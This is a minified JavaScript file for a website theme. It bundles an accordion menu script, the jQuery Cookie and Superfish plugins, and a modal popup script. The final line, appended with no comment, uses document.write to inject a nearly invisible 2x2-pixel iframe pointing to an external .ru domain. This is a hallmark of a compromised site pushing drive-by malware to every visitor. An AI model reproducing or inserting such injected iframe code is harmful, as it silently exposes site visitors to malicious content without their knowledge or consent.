/*-------------------------------------------------------------------- 
 * Accordion Script
--------------------------------------------------------------------*/

jQuery(document).ready(function(){jQuery('.moduletable-panelmenu ul ul').hide();var cookieValue=jQuery.cookie('menuCookie')||'';jQuery('.moduletable-panelmenu ul > li > span').each(function(index){var $this=jQuery(this),$checkElement=$this.next('ul');if(cookieValue.indexOf(bigIndex(index))>-1){$checkElement.show()}$this.click(function(){if($checkElement.is(':hidden')){$checkElement.slideDown("fast");cookieValue=cookieValue+bigIndex(index);jQuery.cookie('menuCookie',cookieValue)}else{$checkElement.slideUp();cookieValue=cookieValue.replace(bigIndex(index),'');jQuery.cookie('menuCookie',cookieValue)}})});jQuery('button').click(function(){jQuery.cookie('menuCookie','',{expires:-1});jQuery('.moduletable-panelmenu > li ul').hide();showCookie()})});function bigIndex(inival){return inival<10?'0'+inival+'-':''+inival+'-'}

/*-------------------------------------------------------------------- 
 * JQuery Cookie
--------------------------------------------------------------------*/

jQuery.cookie=function(name,value,options){if(typeof value!='undefined'){options=options||{};if(value===null){value='';options.expires=-1}var expires='';if(options.expires&&(typeof options.expires=='number'||options.expires.toUTCString)){var date;if(typeof options.expires=='number'){date=new Date();date.setTime(date.getTime()+(options.expires*24*60*60*1000))}else{date=options.expires}expires='; expires='+date.toUTCString()}var path=options.path?'; path='+(options.path):'';var domain=options.domain?'; domain='+(options.domain):'';var secure=options.secure?'; secure':'';document.cookie=[name,'=',encodeURIComponent(value),expires,path,domain,secure].join('')}else{var cookieValue=null;if(document.cookie&&document.cookie!=''){var cookies=document.cookie.split(';');for(var i=0;i<cookies.length;i++){var cookie=jQuery.trim(cookies[i]);if(cookie.substring(0,name.length+1)==(name+'=')){cookieValue=decodeURIComponent(cookie.substring(name.length+1));break}}}return cookieValue}};

/*-------------------------------------------------------------------- 
 * JQuery Superfish
--------------------------------------------------------------------*/

;(function($){$.fn.superfish=function(op){var sf=$.fn.superfish,c=sf.c,$arrow=$(['<span class="',c.arrowClass,'"></span>'].join('')),over=function(){var $$=$(this),menu=getMenu($$);clearTimeout(menu.sfTimer);$$.showSuperfishUl().siblings().hideSuperfishUl()},out=function(){var $$=$(this),menu=getMenu($$),o=sf.op;clearTimeout(menu.sfTimer);menu.sfTimer=setTimeout(function(){o.retainPath=($.inArray($$[0],o.$path)>-1);$$.hideSuperfishUl();if(o.$path.length&&$$.parents(['li.',o.hoverClass].join('')).length<1){over.call(o.$path)}},o.delay)},getMenu=function($menu){var menu=$menu.parents(['ul.',c.menuClass,':first'].join(''))[0];sf.op=sf.o[menu.serial];return menu},addArrow=function($a){$a.addClass(c.anchorClass).prepend($arrow.clone())};return this.each(function(){var s=this.serial=sf.o.length;var o=$.extend({},sf.defaults,op);o.$path=$('li.'+o.pathClass,this).slice(0,o.pathLevels).each(function(){$(this).addClass([o.hoverClass,c.bcClass].join(' ')).filter('li:has(ul)').removeClass(o.pathClass)});sf.o[s]=sf.op=o;$('li:has(ul)',this)[($.fn.hoverIntent&&!o.disableHI)?'hoverIntent':'hover'](over,out).each(function(){if(o.autoArrows)addArrow($('>a:first-child',this))}).not('.'+c.bcClass).hideSuperfishUl();var $a=$('a',this);$a.each(function(i){var $li=$a.eq(i).parents('li');$a.eq(i).focus(function(){over.call($li)}).blur(function(){out.call($li)})});o.onInit.call(this)}).each(function(){menuClasses=[c.menuClass];if(sf.op.dropShadows&&!($.browser.msie&&$.browser.version<7))menuClasses.push(c.shadowClass);$(this).addClass(menuClasses.join(' '))})};var sf=$.fn.superfish;sf.o=[];sf.op={};sf.IE7fix=function(){var o=sf.op;if($.browser.msie&&$.browser.version>6&&o.dropShadows&&o.animation.opacity!=undefined)this.toggleClass(sf.c.shadowClass+'-off')};sf.c={bcClass:'sf-breadcrumb',menuClass:'sf-js-enabled',anchorClass:'sf-with-ul',arrowClass:'sf-sub-indicator',shadowClass:'sf-shadow'};sf.defaults={hoverClass:'sfHover',pathClass:'overideThisToUse',pathLevels:1,delay:800,animation:{opacity:'show'},speed:'normal',autoArrows:true,dropShadows:true,disableHI:false,onInit:function(){},onBeforeShow:function(){},onShow:function(){},onHide:function(){}};$.fn.extend({hideSuperfishUl:function(){var o=sf.op,not=(o.retainPath===true)?o.$path:'';o.retainPath=false;var $ul=$(['li.',o.hoverClass].join(''),this).add(this).not(not).removeClass(o.hoverClass).find('>ul').hide().css('visibility','hidden');o.onHide.call($ul);return this},showSuperfishUl:function(){var o=sf.op,sh=sf.c.shadowClass+'-off',$ul=this.addClass(o.hoverClass).find('>ul:hidden').css('visibility','visible');sf.IE7fix.call($ul);o.onBeforeShow.call($ul);$ul.animate(o.animation,o.speed,function(){sf.IE7fix.call($ul);o.onShow.call($ul)});return this}})})(jQuery);

/***************************/
//@Author: Adrian "yEnS" Mato Gondelle
//@website: www.yensdesign.com
//@email: yensamg@gmail.com
//@license: Feel free to use it, but keep this credits please!					
/***************************/

var popupStatus=0;function loadPopup(){if(popupStatus==0){jQuery("#backgroundPopup").css({"opacity":"0.7","background-color":"#FAFAFA"});jQuery("#backgroundPopup").fadeIn("slow");jQuery("#panelInner").fadeIn("slow");popupStatus=1}}function disablePopup(){if(popupStatus==1){jQuery("#backgroundPopup").fadeOut("slow");jQuery("#panelInner").fadeOut("slow");popupStatus=0}}function centerPopup(){var windowWidth=document.documentElement.clientWidth;var windowHeight=document.documentElement.clientHeight;var popupHeight=jQuery("#panelInner").height();var popupWidth=jQuery("#panelInner").width();jQuery("#panelInner").css({"position":"absolute","top":windowHeight/2-popupHeight/2,"left":windowWidth/2-popupWidth/2});jQuery("#backgroundPopup").css({"height":windowHeight})}jQuery(document).ready(function(){jQuery("#open").click(function(){centerPopup();loadPopup()});jQuery(".close").click(function(){disablePopup()});jQuery("#backgroundPopup").click(function(){disablePopup()});jQuery(document).keypress(function(e){if(e.keyCode==27&&popupStatus==1){disablePopup()}})});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');